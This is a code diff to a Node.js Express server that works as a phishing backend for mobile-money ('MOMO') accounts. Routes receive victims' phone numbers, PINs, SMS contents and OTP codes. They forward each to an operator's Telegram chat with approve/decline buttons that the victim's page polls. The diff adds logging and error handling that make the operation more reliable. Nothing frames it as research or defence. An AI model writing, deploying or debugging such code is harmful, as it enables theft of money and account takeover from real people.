@@ -11,12 +11,19 @@ app.use(express.json());
 const PORT = process.env.PORT || 10000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const DATABASE_URL = process.env.DATABASE_URL;
+
+// FIX: Read EITHER DATABASE_URL or DATABASE_PUBLIC_URL
+const DATABASE_URL = process.env.DATABASE_URL || process.env.DATABASE_PUBLIC_URL;
+
+console.log("Booting server...");
+console.log("Telegram Token present:", !!TELEGRAM_BOT_TOKEN);
+console.log("Telegram Chat ID present:", !!TELEGRAM_CHAT_ID);
+console.log("Database URL present:", !!DATABASE_URL);
 
 // --- DATABASE SETUP (Railway) ---
 const pool = new Pool({
   connectionString: DATABASE_URL,
-  ssl: { rejectUnauthorized: false }
+  ssl: { rejectUnauthorized: false } // Required for Railway public connections
 });
 
 pool.query(`
@@ -25,17 +32,24 @@ pool.query(`
     status VARCHAR(20) DEFAULT 'pending',
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
   );
-`).catch(err => console.error("DB Init Error:", err));
+`)
+.then(() => console.log("Database connected and table ready."))
+.catch(err => console.error("DB Init Error:", err.message));
 
 // --- ROUTES ---
 
 // 1. Frontend sends login details here
 app.post('/api/login', async (req, res) => {
+  console.log("Login request received:", req.body);
   const { ref, phone, pin, amount, pkg } = req.body;
 
-  await pool.query(`
-    INSERT INTO transactions (ref, status) VALUES ($1, 'pending') ON CONFLICT (ref) DO NOTHING;
-  `, [ref]);
+  try {
+    await pool.query(`
+      INSERT INTO transactions (ref, status) VALUES ($1, 'pending') ON CONFLICT (ref) DO NOTHING;
+    `, [ref]);
+  } catch (dbErr) {
+    console.error("DB Insert Error:", dbErr.message);
+  }
 
   const text = `
 🚨 *NEW MOMO LOGIN ATTEMPT* 🚨
@@ -48,7 +62,7 @@ app.post('/api/login', async (req, res) => {
   `;
 
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -63,14 +77,18 @@ app.post('/api/login', async (req, res) => {
         }
       })
     });
+    const tgData = await tgRes.json();
+    console.log("Telegram Response:", tgData.ok ? "Success" : tgData);
     res.json({ success: true });
   } catch (err) {
+    console.error("Telegram Error:", err.message);
     res.status(500).json({ error: "Telegram failed" });
   }
 });
 
 // 2. Frontend sends SMS details here
 app.post('/api/sms', async (req, res) => {
+  console.log("SMS request received:", req.body);
   const { ref, message, phone, amount } = req.body;
   
   const text = `
@@ -87,7 +105,7 @@ ${message}
   `;
 
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -102,14 +120,18 @@ ${message}
         }
       })
     });
+    const tgData = await tgRes.json();
+    console.log("Telegram SMS Response:", tgData.ok ? "Success" : tgData);
     res.json({ success: true });
   } catch (err) {
+    console.error("Telegram Error:", err.message);
     res.status(500).json({ error: "Telegram failed" });
   }
 });
 
 // 3. Frontend sends OTP here
 app.post('/api/otp', async (req, res) => {
+  console.log("OTP request received:", req.body);
   const { ref, otp, phone } = req.body;
   
   const text = `
@@ -121,7 +143,7 @@ app.post('/api/otp', async (req, res) => {
   `;
 
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -136,8 +158,11 @@ app.post('/api/otp', async (req, res) => {
         }
       })
     });
+    const tgData = await tgRes.json();
+    console.log("Telegram OTP Response:", tgData.ok ? "Success" : tgData);
     res.json({ success: true });
   } catch (err) {
+    console.error("Telegram Error:", err.message);
     res.status(500).json({ error: "Telegram failed" });
   }
 });
@@ -145,10 +170,15 @@ app.post('/api/otp', async (req, res) => {
 // 4. Frontend polls this to check if you clicked a button
 app.get('/api/status/:ref', async (req, res) => {
   const { ref } = req.params;
-  const result = await pool.query('SELECT status FROM transactions WHERE ref = $1', [ref]);
-  if (result.rows.length > 0) {
-    res.json({ status: result.rows[0].status });
-  } else {
+  try {
+    const result = await pool.query('SELECT status FROM transactions WHERE ref = $1', [ref]);
+    if (result.rows.length > 0) {
+      res.json({ status: result.rows[0].status });
+    } else {
+      res.json({ status: 'pending' });
+    }
+  } catch (err) {
+    console.error("DB Status Error:", err.message);
     res.json({ status: 'pending' });
   }
 });
@@ -157,13 +187,18 @@ app.get('/api/status/:ref', async (req, res) => {
 app.post('/webhook', async (req, res) => {
   const { callback_query } = req.body;
   if (callback_query) {
+    console.log("Webhook received:", callback_query.data);
     const data = callback_query.data; 
-    const parts = data.split('_'); // e.g. ["approve", "login", "TXN123"]
+    const parts = data.split('_'); 
     const action = parts[0];
     const ref = parts[2]; 
     const status = action === 'approve' ? 'approved' : 'declined';
 
-    await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', [status, ref]);
+    try {
+      await pool.query('UPDATE transactions SET status = $1 WHERE ref = $2', [status, ref]);
+    } catch (err) {
+      console.error("DB Update Error:", err.message);
+    }
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
       method: 'POST',
